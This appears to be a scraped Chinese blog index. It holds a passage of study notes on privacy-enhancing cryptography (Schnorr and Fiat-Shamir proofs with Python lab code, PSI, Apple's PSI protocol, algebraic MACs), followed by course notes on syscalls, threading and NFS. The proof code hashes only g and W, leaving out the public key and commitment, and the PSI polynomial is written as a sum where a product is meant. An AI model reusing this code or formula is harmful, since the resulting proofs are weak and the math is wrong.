发送给 Verifier Verifier 验证 $g^r\\cdot pub^c=W$ 我们来看一下这个协议是否满足零知识证明的几条性质：\nCompleteness：即正确性 Integrity / Soundness：即这样做是否就能证明 Prover 真的知道 x Privacy / Zero-knowledge：即这样做是否会泄露 x 的信息 Completeness 很容易证明：$g^r\\cdot (g^x)^c=g^{w-cx}g^{cx}=g^w=W$。\n为了证明 Soundness，我们假设可能的挑战值只有两个：$c$ 和 $c\u0026rsquo;$。如果要成功证明，Prover 要以大于二分之一的概率给出正确的 $r$ 或 $r\u0026rsquo;$，$r=w-cx$，$r\u0026rsquo;=w-c\u0026rsquo;x$。然而如果 Prover 不知道 $x$，那么这两个等式均为线性等式且有两个未知数 $w$ 和 $x$，此时 Prover 不可能以大于二分之一的概率给出正确答案。\nZero-knowledge 的证明方式则比较奇怪。我们看到上述协议的 transcript 是 $(W,c,r)$。假如任何人都能构造这样的三元组使得其能通过 Verifier 检查，那么这就说明 $x$ 的信息不可能被泄露，因为这里根本没有用到 $x$。而要构造这样的三元组，只需要随机选择 $r\u0026rsquo;\u0026rsquo;,c\u0026rsquo;\u0026rsquo;$，计算 $W\u0026rsquo;\u0026rsquo;=g^{r\u0026rsquo;\u0026rsquo;}pub^{c\u0026rsquo;\u0026rsquo;}$（注意 $pub=g^x$ 是公钥，并没有用到 $x$），那么 $(W\u0026rsquo;\u0026rsquo;,c\u0026rsquo;\u0026rsquo;,r\u0026rsquo;\u0026rsquo;)$ 就能通过检查。\nFiat-Shamir 启发式技术 # 实际运用中我们更多时候希望能有一种非交互式的零知识证明，而 Fiat-Shamir 启发式技术就是一种将 Schnorr Identification 协议转化为非交互式的通法。\n公共参数：群 $G$，$q=ord(G)$，生成元 $g$ Prover 拥有私钥 $x$，公钥 $pub=g^x$。选择随机的 $w$，计算 $W=g^w$ 计算 $c=H(pub,W,m)$ ，$r=w-cx\\ (mod\\ q)$，发送 $m,(c,r)$ 给 Verifier Verifier 验证 $H(pub,g^rpub^c,m)=c$ 如果攻击者要伪造证明，需要先设置 $r,c$ 再计算 $W$。然而在第三步中 $c$ 依赖于 $W$ 的哈希，因此不能这样计算。\n下面用非交互式零知识证明来证明知道 DH 私钥的信息：\n@pytest.mark.task1 def test_provekey_correct(): params = setup() # Correct proof priv, pub = keyGen(params) proof = proveKey(params, priv, pub) assert verifyKey(params, pub, proof) @pytest.mark.task1 def test_provekey_incorrect(): params = setup() priv, pub = keyGen(params) # Incorrect proof priv2, pub2 = keyGen(params) proof2 = proveKey(params, priv2, pub2) assert not verifyKey(params, pub, proof2) def to_challenge(elements): \u0026#34;\u0026#34;\u0026#34; Generates a Bn challenge by hashing a number of EC points \u0026#34;\u0026#34;\u0026#34; Cstring = b\u0026#34;,\u0026#34;.join([hexlify(x.export()) for x in elements]) Chash = sha256(Cstring).digest() return Bn.from_binary(Chash) def proveKey(params, priv, pub): \u0026#34;\u0026#34;\u0026#34; Uses the Schnorr non-interactive protocols produce a proof of knowledge of the secret priv such that pub = priv * g. Outputs: a proof (c, r) c (a challenge) r (the response) \u0026#34;\u0026#34;\u0026#34; G, g, hs, o = params w = o.random() W = w * g c = to_challenge([g, W]) r = w - c*priv return c, r def verifyKey(params, pub, proof): \u0026#34;\u0026#34;\u0026#34; Schnorr non-interactive proof verification of knowledge of a secret. Returns a boolean indicating whether the verification was successful. \u0026#34;\u0026#34;\u0026#34; G, g, hs, o = params c, r = proof gw_prime = c * pub + r * g return to_challenge([g, gw_prime]) == c 类似地，我们同样可以证明关于一个 Commitment 的离散对数表示：\n@pytest.mark.task2 def test_proveCommit_correct(): params = setup() # Correct proof secrets = [10, 20, 30, 40] C, r = commit(params, secrets) proof = proveCommitment(params, C, r, secrets) assert verifyCommitments(params, C, proof) @pytest.mark.task2 def test_proveCommit_incorrect(): params = setup() # Correct proof secrets = [10, 20, 30, 40] C, r = commit(params, secrets) proof = proveCommitment(params, C, r, secrets) # Incorrect proof secrets2 = [1, 20, 30, 40] C2, r2 = commit(params, secrets2) proof2 = proveCommitment(params, C2, r2, secrets2) assert not verifyCommitments(params, C, proof2) assert not verifyCommitments(params, C2, proof) def commit(params, secrets): \u0026#34;\u0026#34;\u0026#34; Produces a commitment C = r * g + Sum xi * hi, where secrets is a list of xi of length 4. Returns the commitment (C) and the opening (r). \u0026#34;\u0026#34;\u0026#34; assert len(secrets) == 4 G, g, (h0, h1, h2, h3), o = params x0, x1, x2, x3 = secrets r = o.random() C = x0 * h0 + x1 * h1 + x2 * h2 + x3 * h3 + r * g return C, r def proveCommitment(params, C, r, secrets): \u0026#34;\u0026#34;\u0026#34; Prove knowledge of the secrets within a commitment, as well as the opening of the commitment. Args: C (the commitment), r (the opening of the commitment), and secrets (a list of secrets). Returns: a challenge (c) and a list of responses. \u0026#34;\u0026#34;\u0026#34; G, g, (h0, h1, h2, h3), o = params x0, x1, x2, x3 = secrets w = o.random() w0 = o.random() w1 = o.random() w2 = o.random() w3 = o.random() W = w * g + w0 * h0 + w1 * h1 + w2 * h2 + w3 * h3 c = to_challenge([g, h0, h1, h2, h3, W]) rr = w - c*r r0 = w0 - c*x0 r1 = w1 - c*x1 r2 = w2 - c*x2 r3 = w3 - c*x3 responses = (r0, r1, r2, r3, rr) return c, responses def verifyCommitments(params, C, proof): \u0026#34;\u0026#34;\u0026#34; Verify a proof of knowledge of the commitment. Return a boolean denoting whether the verification succeeded. \u0026#34;\u0026#34;\u0026#34; (G, g, (h0, h1, h2, h3), o) = params c, responses = proof (r0, r1, r2, r3, rr) = responses Cw_prime = c * C + r0 * h0 + r1 * h1 + r2 * h2 + r3 * h3 + rr * g c_prime = to_challenge([g, h0, h1, h2, h3, Cw_prime]) return c_prime == c 相等性证明 # 实际上，零知识证明不仅可以用于证明知道某个秘密，还可以证明任意关于某个秘密的逻辑表达式。以相等性证明为例，假如有 $P_1=g^x,P_2=h^x$，$g,h$ 是群 $G$ 的生成元，而 Prover 想证明两个 $x$ 相等，那么可以结合 2 次 Schnorr 协议，采用 Fiat-Shamir 技术实现 NIKP。\nProver 选择随机 $w$，$W_1=g^w,W_2=h^w$ 计算 $c=H(g,h,P_1,P_2,W_1,W_2)$，$r=w-cx$，发送 $(c,r)$ 给 Verifier Verifier 验证 $H(g,h,P_1,P_2,g^rP_1^c,h^rP_2^c)=c$ @pytest.mark.task3 def test_proveEquality_correct(): params = setup() x, K, L = gen2Keys(params) proof = proveDLEquality(params, x, K, L) assert verifyDLEquality(params, K, L, proof) @pytest.mark.task3 def test_proveEquality_incorrect(): params = setup() x, K, L = gen2Keys(params) _, _, L2 = gen2Keys(params) proof = proveDLEquality(params, x, K, L) assert not verifyDLEquality(params, K, L2, proof) def gen2Keys(params): \u0026#34;\u0026#34;\u0026#34; Generate two related public keys K = x * g and L = x * h0. \u0026#34;\u0026#34;\u0026#34; G, g, (h0, h1, h2, h3), o = params x = o.random() K = x * g L = x * h0 return x, K, L def proveDLEquality(params, x, K, L): \u0026#34;\u0026#34;\u0026#34; Generate a ZK proof that two public keys K, L have the same secret private key x, as well as knowledge of this private key. \u0026#34;\u0026#34;\u0026#34; G, g, (h0, h1, h2, h3), o = params w = o.random() Kw = w * g Lw = w * h0 c = to_challenge([g, h0, Kw, Lw]) r = (w - c * x) % o return c, r def verifyDLEquality(params, K, L, proof): \u0026#34;\u0026#34;\u0026#34; Return whether the verification of equality of two discrete logarithms succeeded. \u0026#34;\u0026#34;\u0026#34; G, g, (h0, h1, h2, h3), o = params c, r = proof k_prime = c*K + r*g l_prime = c*L + r*h0 return to_challenge([g, h0, k_prime, l_prime]) == c 安全多方计算 MPC # 在安全多方计算中，多个实体希望能利用自己私有的输入一起计算出一个输出，但不希望泄露私有输入的信息。\n一个常见的使用 MPC 的例子是 Oblivious Transfer，此时发送者拥有多个信息，接收者发送一个数值 b，此时发送者的其中一条信息（例如下标为 b 的信息）会被发送给接收者。在此过程中，发送者不知道 b，接收者也不知道其他没接收到的信息。其他 MPC 相关例子包括 E-Voting、Proof-of-Stake、私有集合交集等等。\n安全定义 # 存在两种方法来对一个协议的安全作出定义：启发式方法和严谨方法。前者尝试对协议进行攻击，如果攻击成功则改进协议，直到无法攻击为止。这种方法无法考虑到所有攻击、或是未来的新的攻击，因此并不推荐。严谨方法则可以分为如下步骤：\n定义攻击者的类型和能力 被动 / 主动？ 计算能力有限 / 无限？ 能否与系统中其他实体合作？ 定义网络模型 实体间通信是否使用安全信道？ 攻击者能否修改消息顺序？ 定义“安全”的语义 通过游戏定义（密码学常用方法） 通过模拟定义（MPC 所用的方法） 设计协议 证明协议在上述条件下是安全的 游戏定义的安全我们在密码学中已经很熟悉了，而模拟定义的安全则基于两个模型：理想模型和现实模型。在理想模型中，参与者将输入发送给一个可信第三方，由它来计算结果并输出；而在现实模型中，由于并不存在这样的 TTP，会实际运行这个 MPC 协议来获得输出。\n如果任意针对现实模型的攻击都同样能针对理想模型，那么协议就是安全的，因为理想模型下无法开展攻击。这里用了一点反证法，实际上就是密码学中常用的那种套壳归约的方法（经典例子：将 DH 密钥交换协议归约到 DDH 问题上）。一言以蔽之，如果攻击者无法区分它处于理想模型中还是现实模型中，那么协议就是安全的。\n涉及技术 # 同态加密 全同态加密（支持任意运算，开销较大） 部分同态加密 Commitment Scheme 秘密分享 可信执行环境 TEE 区块链 私有集合交集 PSI # 顾名思义，PSI 旨在计算多个集合的交集而不泄露集合的信息。可以看到，如果把每个参与者的私有集合作为输入，集合交集作为运算，那么 PSI 就是 MPC 的一种特例。面对被动攻击者时，PSI 只需要满足机密性即可；而面对主动攻击者，PSI 需要确保交集运算的结果正确，即能检测对结果的篡改。\n涉及技术 # 安全性\n同态加密\n表示为有限域上的多项式\n$p(x)=\\Sigma_{i=1}^d(x-s_i)\\ for\\ S={s_1,\u0026hellip;,s_d}$ 多项式的根即集合元素，多项式之和的根即为交集（或求 GCD） 对于 d 次多项式 $p_A,p_B$（代表 $S^{(A)},S^{(B)}$），以及随机的 d 次多项式 $\\gamma_A,\\gamma_B$，令 $\\theta=\\gamma_A\\cdot p_A+\\gamma_B\\cdot p_B=\\mu\\cdot gcd(p_A,p_B)$，$\\mu$ 为随机多项式，此时 $\\theta$ 仅包含 $S^{(A)}\\cap S^{(B)}$ 的信息而不包含任一集合其余元素的信息 哈希函数\n伪随机函数\n性能\n数据结构 哈希表：将集合元素哈希到表中，在表上计算 布隆过滤器：状态压缩后进行传输和计算 将 ZKP 替换为一些特殊的方法，如在输入中设置陷阱来防篡改 Horner 方法 分类 # 在传统 PSI 中，参与者交互式地执行协议以计算结果，每次计算都要使用本地的集合数据。然而在委托式 PSI 中，参与者可以将数据编码后上传至云服务商，委托云服务商进行 PSI 计算：这种委托可以是一次性的，即每次计算都要重新将数据编码上传；也可以是重复的，一次上传多次使用。\n应用场景 # 在线游戏作弊检测 疫情接触者追踪 Chrome 扩展检查密码是否在泄露数据库中 SNS 查找共同好友 🌰 Apple PSI # Apple 使用 PSI 技术来检测用户的 iCloud 中是否存储了非法的儿童色情图片，同时避免泄露用户 iCloud 中的正常图片。\n假设 $X$ 是服务器中非法图片的哈希值集合，客户端中的图片集合可以用 $Y=((y_1,id_1,ad_1),\u0026hellip;,(y_m,id_m,ad_m))$，其中 $id$ 是每个元素的标识符，$y$ 是该图片的哈希值，$ad$ 是附加信息。现在，如果客户端拥有超过阈值 $t$ 张照片满足其对应的 $y_i$ 位于 $X$ 集合中，那么我们希望能获得所有的对应的 $(id_i,ad_i)$ 集合。\n例如，$X=(y_1,y_2,y_3,y_4,y_5),Y=((y_1,id_1,ad_1),(y_3,id_3,ad_3),(y_8,id_8,ad_8)),t=1$，由于符合条件的照片数超过了阈值 1，服务器应该能且只能收到 $(id_1,ad_1),(id_3,ad_3)$，并且无法获得任何关于 $(y_8,id_8,ad_8)$ 的信息。\n那么这一目标是如何达到的呢？首先，我们需要：\n哈希表 $T$，其对应的哈希函数是 $h$，容量为 $n'$ 密钥生成函数 $H'$ 对称加密机制 $(Enc,Dec)$ 另一个哈希函数 $H$ 阈值为 t 的秘密分享机制：至少需要 t+1 份秘密碎片才能重建秘密 整个协议是这样运行的：\n服务端根据 $X$ 计算出 pdata 和服务端密钥，发送 pdata 给客户端\n客户端检查 pdata 中元素两两不同且非空，生成客户端密钥 adkey\n客户端利用客户端密钥、pdata、客户端的一张照片计算出对应的 voucher 发送给服务器\n服务器利用服务端密钥、voucher 计算出最终结果\n在第一步中，服务器先将 $X$ 中的值插入到 $T$ 中，选择随机值 $\\alpha$ 和有限域生成元 $G$，计算 $L=G^\\alpha$（为了隐藏 $\\alpha$，类似非对称密码）。对于每个 $T$ 中元素，如果该元素非空，计算 $P_i=(H(T[i]))^\\alpha$；否则，设置 $P_i$ 为随机值。最后，pdata 被设置为 $(L,P_1,\u0026hellip;,P_{n\u0026rsquo;})$ 并发送。\n到了第三步，客户端首先加密附加信息：$adct=Enc_{adkey}(ad)$，生成 $adkey$ 的秘密碎片 $sh$，随后随机选择新的密钥 $rkey$，计算 $rct=Enc_{rkey}((adct,sh))$。\n接下来，客户端需要对这张照片的 $y$ 进行编码，首先决定其在哈希表的位置：$w=h(y)$，随后加密 $y$ 得到 $Q$ 并生成 tag $S$：选择随机的 $\\beta,\\gamma$，计算 $Q=(H(y))^\\beta\\cdot G^\\gamma$。从 pdata 中取 $P_w,L$，计算 $S=(P_w)^\\beta\\cdot L^\\gamma$。接着生成新密钥 $S\u0026rsquo;=H\u0026rsquo;(S)$，用来加密 $rkey$：$ct=Enc_{S\u0026rsquo;}(rkey)$。最后，voucher 被设置为 $(id,Q,ct,rct)$ 并发送。\n第四步，服务器首先初始化空列表 SHARES。从 voucher 中读取 $Q$，计算 $\\hat{S}=Q^\\alpha$。\n如果照片在 $X$ 中，那么 $\\hat{S}=Q^\\alpha=(H(y))^{\\beta\\alpha}\\cdot G^{\\gamma\\alpha}=(P_w)^\\beta\\cdot L^\\gamma=S$。\n然后，服务器生成新密钥 $\\hat{S\u0026rsquo;}=H\u0026rsquo;(\\hat{S})$，提取 $rkey=Dec_{\\hat{S\u0026rsquo;}}(ct)$，如果解密失败则中止。下一步则是提取 $adct$ 和 $sh$，只需要 $(adct,sh)=Dec_{rkey}(rct)$，如果解密失败同样中止。解密完成后，将 $(id,adct,sh)$ 加入到 SHARES 中。此时我们成功匹配到了非法图片。\n如果 SHARES 中存在至少 t+1 份碎片，那么就可以重建 $adkey$ 了。最后一步就是利用 $adkey$ 提取 $ad$：$ad=Dec_{adkey}(adct)$。\nSelective Disclosure # 传统认证系统往往将身份和属性绑定，这会导致一定程度的隐私泄露。而在 Selective Disclosure 中，Verifier 不会获得任何关于 Prover 的非必要的信息。首先 Issuer 给 Prover 一个类似证书的 credential，随后 Prover 对自身的属性进行断言发给 Verifier，最后 Verifier 和 Issuer 交互来验证 Prover 的断言是否合法。\n这里介绍一种基于 MAC 的方案，该方案假设 Issuer 和 Verifier 是同一主体。\n传统方式中，Prover 将断言发给 Verifier 时由于用到了 MAC，无法破坏完整性，但 MAC 并不提供机密性。但如果加入零知识证明和匿名通信机制，那么 Prover 就可以通过匿名通信信道和 Verifier 交互，并通过零知识证明来证明断言、以及对应的 MAC。\nAlgebraic MAC # Algebraic MAC 提供了两个很好的性质：\n在可行时间里证明 MAC 的正确生成（Issuing） 在可行时间里证明 MAC 的持有（Showing） 首先需要一个素群 G，生成元 g 和 h，随后生成私钥 $sk={x_0,x_1,\u0026hellip;,x_k}$，其中 k 是要编码的属性个数。随后公布 Issuer 参数 $\\texttt{iparams=}{X_i=h^{x_i}} \\texttt{ for }i\u0026gt;0$。\nAlgebraic MAC 以私钥和 k 个属性 $m={m_i}\\texttt{ for }1\u0026lt;=i\u0026lt;=k$，选择一个 $u\\in G/{1}$,计算 $u\u0026rsquo;=u^{H_{sk}(m)}$，其中 $H_{sk}(m)=x_0+\\Sigma m_ix_i$。最后输出 tag：$(u,u\u0026rsquo;)$\n验证的过程则是反过来，验证 $u\u0026rsquo;$ 是否等于 $u^{H_{sk}(m)}$。这里可以注意到，MAC 的生成和验证都需要私钥。\naMAC + ZKP # 在 Selective Disclosure 方案中，我们要让 Prover 零知识证明它知道关于这些属性的合法的 aMAC。整个方案分四阶段：\nSetup 初始化参数 （G，p，g，h） CredKeyGen 生成 Issue 密钥和公钥 Credential Issuance Protocol Credential Showing Protocol 在 CredKeyGen 中，首先初始化 aMAC 的参数，随后在 $Z_p$ 中随机选择 $o_{xo}$，计算 Commitment $C_{xo}=g^{x_0}h^{o_{xo}}$。输出公钥 $(\\texttt{iparams}, C_{xo})$，私钥 $(sk,o_{xo})$。\nCredential Issuance 中 Issuer 将属性编码成消息 $m_i$，计算 $Tag(u,u\u0026rsquo;)=MAC(sk,{m_i})$，然后计算证明 $\\pi_0=NIZK\\{(sk,o_{xo}):u\u0026rsquo;,C_{xo},X_i\\}$。Prover 获得 $(u,u\u0026rsquo;)$ 后，验证 $\\pi_0$。\nCredential Showing 中 Prover 在 $Z_p$ 中随机选择 $a,z_i,r$，计算：\n$u_a,u_a\u0026rsquo;=(u^a,u\u0026rsquo;^a)$ $C_{mi}=u^{m_i}h^{z_i}$ $C_{u\u0026rsquo;}=u_a\u0026rsquo;g^r$ 随后产生证明 $\\pi_1=NIZK\\{(z_i,r,m_i):C_{mi},V=g^{-r}\\Pi X_i^{z_i}+\u0026hellip;\\}$， ... 处是其他关于属性的声明。输出 $(u_a,C_{mi}, C_{u\u0026rsquo;}),\\pi_1$.\n选择这么多随机数都是为了让属性匿名化。\n最后，Verifier 计算 $V=u_a^{x_0}\\Pi C_{mi}^{x_i}/C_{u\u0026rsquo;}$，并利用 $V$ 来验证 $\\pi_1$.\n应用 # 基于属性的访问控制 分布式身份管理 隐私友好的电子身份信息 ","date":"2022-02-04","permalink":"/posts/pet/","section":"Posts","summary":"\u003cp\u003ePrivacy Enhancing Technologies (PET)，实际上还是密码学。\u003c/p\u003e","title":"扑朔迷离：隐私增强技术实践"},{"content":"","date":"2022-02-04","permalink":"/tags/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/","section":"Tags","summary":"","title":"同态加密"},{"content":"","date":"2021-10-18","permalink":"/categories/%E5%90%8E%E7%AB%AF/","section":"Categories","summary":"","title":"后端"},{"content":"COMP0133《分布式系统与安全》是我从本科到硕士期间最有价值的课。\n序 # 我最初因为选了《恶意软件》这门课，没敢选同一学期同样硬核的《分布式系统与安全》。后来一方面是因为《恶意软件》过于形式化、一方面是因为接触了分布式系统的生态，我选择了换课。第一节课开始没多久，我便确信自己做出了明智的（或许还是影响深远的）决定。\nBrad Karp 老师讲解清晰又不失风趣，硬是把线上课上出了线下课的体验。尽管才上了两周的课，我相信这门课会让我受益匪浅。\n一开始给我留下比较好的印象的就是老师摒弃了学校的课程平台 Moodle，转而使用 GitHub Classroom 和 Piazza。众所周知，所谓学校的课程平台并不会给师生带来什么好的体验。\n此外，GitHub Classroom 还能自动测试和批改作业，很有意思，使用体验也很好。\n这门课是没有教材的，这实际上对老师的水平提出了很高的要求：他必须自己四处收集资源备课、讲述自己的理解，而非将教材上的内容略作修改、照本宣科。取而代之的阅读材料是一系列经典论文。\n背景 # 中心化系统面临的问题 # 单节点故障 难以支撑流量较大的应用 易受攻击，且受到攻击后损失较大（这其实也应该算到单节点故障里？可能不能算故障） 难以伸缩以提高资源利用率 升级与维护时必须中止服务 地理距离带来的网络延迟 分布式系统引入的问题 # 数据一致性 节点间的网络延迟、网络错误 Heterogeneity 异质性，不同节点可能使用不同语言、接口、API 等 节点间并发问题 Partition resilience，不知道怎么翻译，弹性划分问题？ 关于 Partition resilience 问题：假设两个用户在两个不同的服务节点上同时购买了最后一张机票，这张机票就会被卖出两次。有点像数据一致性问题。\nOS 相关 # 这个部分基本是本科《操作系统》课的内容，记录时顺便复习下。\nSyscall # 例如，应用通过 close(3) 关闭文件。而在 C 函数库中是这样调用 syscall 的：\nclose(x) { R0 \u0026lt;- 73 R1 \u0026lt;- x TRAP RET } TRAP 实际上做的是：\nXP \u0026lt;- PC // switch to kernel address space // set privileged flag (to enter high privilege mode) PC \u0026lt;- address of kernel trap handler 这里的 XP 是某个用来暂时存放 PC 的寄存器。我们容易想到，之后就要在内核中运行代码了，这其实是十分危险的操作。怎么保证应用不会在内核里乱搞呢？答案是 Protected Transfer 机制。\n为了避免用户在内核里随便运行代码，只有通过 kernel entrypoint 进入内核才能运行代码，而这个 entrypoint 就是 trap handler。至于具体跳到内核的什么位置则由硬件决定，而不能由应用来指定。这个具体位置则只能通过在启动时运行的内核态代码来决定，确保了用户态程序无法随意跳转到内核任意位置。\n接着，在内核的 trap handler 中：\n// save regs to this process\u0026#39; PCB SP \u0026lt;- kernel stack sys_close() // executing in \u0026#34;kernel half\u0026#34; of process // restore regs from PCB TRAPRET 最后的 TRAPRET 的流程就比较简单了：\nPC \u0026lt;- XP // clear privileged flag // switch to process address space // continue execution 可以看到，TRAP 和 TRAPRET 要保存 / 恢复 PC、切换地址空间、切换用户态 / 内核态，而 trap handler 要保存 / 恢复寄存器，这些过程是必需的但又并没有产生实际的价值，还相对比较耗时。\n并发 IO # 而且，Syscall 常常涉及阻塞 IO 操作，很大程度上降低了资源利用率。一般来说有如下三种解决方法：\n多进程 单进程、多线程 事件驱动 IO 但首先，OS 本身对单进程单线程也提供了一定程度的并发 IO，比如：\n在文件系统中，会进行 read-ahead 和 write-behind 预读写磁盘数据 类似地，read() 接收网络包时也会拷贝到 kernel socket buffer，write() 发送数据包时也会拷贝到 kernel socket buffer 多进程 # 多进程很容易理解：当一个进程阻塞后，切换到另一个进程运行。优点在于：\n进程间本身就相互隔离，不会互相影响 （如果有多个 CPU）同时还自动获得了 CPU 并发 不过 CPU 并发没有 IO 并发那么重要，且相对 IO 并发而言更难实现，两者对速度的提升也是 2 倍和 100 倍的数量级。此时，氪金多买几台机器显然是更好的选择。\n然而，多进程也有缺点：\nfork() 调用本身比较耗时、耗内存，300 微秒左右的耗时并不能通过提升机器配置来缩短 隔离性同时也是缺点，不共享内存意味着构建缓存或是记录统计数据比较麻烦 多线程 # 另一种方法是使用更轻量级的线程，此时线程们共享内存且分别拥有自己的栈，维持了一定的独立性。这一好处带来的是非常棘手的问题，那就是线程之间本身会互相影响、线程对数据的读写同样如此，使得我们不得不引入锁的机制来避免这些问题。但是引入新机制又会带来新问题，比如饥饿、死锁等。\n这很像之前看到的火箭工程：要让火箭飞起来就需要带足够的燃料，但这些燃料本身也有重量，于是需要更多的燃料让整个火箭飞起来……（坎巴拉太空计划核心玩法）\n几乎所有现代操作系统都对多线程有原生支持，这一般是通过内核线程实现的。这种实现下，内核清楚地知道每个线程的状态，也可以亲自调度线程到 CPU 上，非常灵活且同时支持 CPU 并发和 IO 并发。对于线程来说，每个线程不仅需要原有的用户态栈，还需要维护自己的内核栈和寄存器表。\n这么做的代价就是：\n创建线程要内核干涉 线程上下文切换要内核干涉 加锁解锁也要内核干涉 实现起来很大程度上依赖于 OS，难以移植 至于用户线程，对内核来说就是不可见的，内核只负责调度进程。此时，进程内部就需要一个线程调度器，清晰地知道每个线程的状态如何并及时调度。这样我们就可以进行非阻塞式 Syscall 了：\nread() { // tell kernel to start read // mark thread waiting for read sched(); } sched() { // ask kernel for IO completion events // mark corresponding threads runnable // find runnable thread // restore regs and return } 看起来很不错，但是仔细想想，这中间涉及的事件通知机制，需要我们的调度器具备相当强大的能力。它需要让内核通知它：\n创建网络连接事件 数据到达 socket 事件 磁盘读取完成事件 socket 能够继续被 write() 事件 ……这基本上就是在组装一个小型 OS 了。更不用说，事件通知机制在 OS 里一般也没有完整的支持，比如在 Unix 中就没有文件系统操作完成事件的通知机制。Syscall 也并不总是能完全不进行阻塞等待，比如 open() 和 stat() 等。\n最后，非阻塞式 Syscall 还很难实现。例如可以看下 sys_read() 的大致实现：\nsys_read(fd, user_buffer, n) { // read the file\u0026#39;s i-node from disk struct inode *i = alloc_inode(); start_disk(..., i); wait_for_disk(i); // the i-node tells us where the data are; read it struct buf *b = alloc_buf(i-\u0026gt;...); start_disk(..., b); wait_for_disk(b); copy_to_user(b, user_buffer); } 这个函数分为两步，先获取 inode，再写入 buffer，期间都需要 wait_for_disk()，使得程序在内核中被挂起。这种情况下，非阻塞式的 Syscall 此时需要从内核中返回防止阻塞，但这样内核就无从知晓 sys_read() 刚才执行到哪里了，sys_read() 也没法继续执行下去了。\n因此，如果要使用用户线程，我们要么只能使用一个支持不那么完整的实现，要么就是重写底层的 Syscall 使得一个 Syscall 内部执行一个非阻塞的过程。这会导致一个 open() 的系统调用可能会被拆成几十个小系统调用，比如通过 lookup_one_path_component() 查找一层目录。毫无疑问，这会导致代码极其繁琐。\n总的来说，可能只有对性能有苛刻要求的情况下才会使用用户线程，以节省掉用户态 / 内核态切换的开销。\n现在有 goroutine 了。\nNFS # 这里主要讨论 NFS v2。\n设计目标 # 应当能够用于现存的应用，即提供与 Unix 文件系统相同的语义 应当能够简单地部署 应当支持多种平台 应当足够高效，但不需要和 Unix 本地文件系统一样高效 远程文件与目录的命名 # NFS Client 使用 mounter 将远程目录挂载到本地目录。mounter 向指定的 NFS Server 发送 RPC 请求并获得一个 32 字节的 file handle 用于后续请求，可以将 file handle 理解为 inode。对 NFS Server 而言，file handle 实际上由 fs identifier、inode number 和 generation number 三部分组成。\n为什么 NFS 不直接用常规的文件路径来标识文件呢？当然是为了处理数据一致性的问题。假设一个 Client 打开了 dir1 下的文件正准备读取，此时另一个 Client 却重命名了这个目录为 dir2，那么根据 Unix 规范最终读取的路径是 dir2/xxx 。如果 NFS 直接用文件路径标识文件，就无法与 Unix 文件系统的行为保持一致，这也是 file handle 中引入 inode 的原因。\n那么 generation number 又有什么用？假设一个 Client 打开了一个文件正准备读取，此时另一个 Client 却删除了这个文件，创建了新的同名文件，那么根据 Unix 规范最终读取的是旧文件的内容。如果 NFS 恰好将旧文件的 inode 分配给新创建的文件，就会导致读到的是新文件的内容。generation number 则会在重用 inode 时 +1，确保读到的是原来的旧文件。解决了重用 inode 的风险，NFS Server 就能立刻回收 inode。\n即使 Client 打开文件获得 file handle 后 Server 宕机，这个 file handle 在 Server 恢复后依然有效。\nRPC # 以读文件为例：\nsequenceDiagram participant A as Application participant C as Client participant S as Server A-\u003e\u003eC: OPEN(\"f\",0) C-\u003e\u003eS: LOOKUP(dirfh,\"f\") S-\u003e\u003eS: Look up \"f\" in directory dirfh S-\u003e\u003eC: fh and file attributes C-\u003e\u003eA: fd A-\u003e\u003eC: READ(fd,buf,n) C-\u003e\u003eS: READ(fh,0,n) S-\u003e\u003eS: Read from fh S-\u003e\u003eC: Data and file attributes C-\u003e\u003eA: Data A-\u003e\u003eC: CLOSE(fd) 图中的 fh 指 file handler，并且默认 Application 之前已经获得了目录的 file handler 即 dirfh。\n从图中可以看到，Server 并不需要维护任何客户端状态，每次 RPC 请求中带着读文件所需要的全部信息，也就是说 Server 是一个无状态服务。无状态服务的好处在于：\n对 Server 来说，从故障中恢复并不需要做任何额外的事，就好像故障从来没发生过一样 对 Client 来说，如果请求没有得到响应，只要不断重试即可 重试导致的结果是，同一个请求可能被 Server 执行多次，如果是类似删除文件等请求，就会出现奇怪的结果。后来，NFS 通过让 Server 维护一个 transaction ID 和 reply cache 来避免这一问题，不过 reply cache 就会在重启后失效了。换而言之，如果 Client 在 Server 正常时删除了文件，Server 重启后再次删除，依然会得到“文件不存在”的错误，但这种情况已经是小概率事件了。\n如果使用一种更健全的方案，就需要持久化到磁盘上，这会带来很大的开销和实现复杂度。NFS 选择不这么做，就是为了确保系统的内部实现足够简单，同时保持了无状态的特性。这种为了实现简单而有意牺牲一小部分正确性、一致性和完备性的做法正是 Worse is Better 的设计思想。\n扩展 Unix 文件系统 # 为了更无缝地适配到 Unix 文件系统，NFS 引入了 vnode 的概念，这实际上是对 inode 的一层抽象，使得 vnode 既可标识本地文件，又可标识远程文件。同时，vnode 还可以标识同一台机器上几种不同文件系统中的文件。\nvnode 提供的接口使得开发者无需关心操作的文件来自哪里，许多现有程序代码也更容易迁移。\n例如，当应用程序调用 open 系统调用时，会通过 File syscall layer-\u0026gt;Vnode layer-\u0026gt;Client-\u0026gt;Server-\u0026gt;Vnode layer-\u0026gt;File system 的路径一步步 LOOKUP 并最终打开文件。\nClient 也会对最近使用的 vnode 进行缓存以减少 RPC 请求。然而，多个 Client 缓存了同一个文件时，就会出现缓存一致性的问题。\n缓存一致性 # 如果一个应用写了本地文件，文件的改动通常会写入缓存而不是立刻写入 Server。在这段时间里，另一个 Client 读取到的文件就是尚未更新的文件，引起缓存一致性问题。\nNFS 提供了两种保证缓存一致性的方法：\nclose-to-open consistency 如果先 CLOSE 后 OPEN，就能保证 READ 读到的数据一定是 WRITE 操作之后的 如果在 CLOSE 前 OPEN，则无法保证这一点，这也是缓存一致性和数据一致性的区别所在 read-write consistency：如果 OPEN 了同一文件，则 READ 读到的数据一定是 WRITE 操作之后的，显然这样更能保证一致性但开销更大 close-to-open consistency 的具体原理，是每次应用 OPEN 文件时，都会检查本地缓存中文件的修改时间和 GETATTR RPC 请求所获得的 vnode 修改时间，如果不一致，则删除缓存重新获取文件。而 WRITE 则只会写到本地缓存，直到 CLOSE 后改动才会写到 Server 中。\n局限性 # 安全性：NFS 并没有把安全性放在一个重要的地位，未授权访问、中间人攻击都是可行的 可伸缩性：NFS Server 承受的流量压力较大，无法支持过多 NFS Client 因为性能、丢包处理等原因，难以在大规模复杂网络中使用 为什么 NFS 安全措施极弱，但却没有受到严重的攻击？主要原因可能是 file handle 难以猜解。\nRPC 透明性 # 设计目标 # 编写分布式系统代码时，尽可能减少对客户端和服务端的代码和行为上的改动，并使得开发者无需关心网络带来的问题。也就是说，RPC 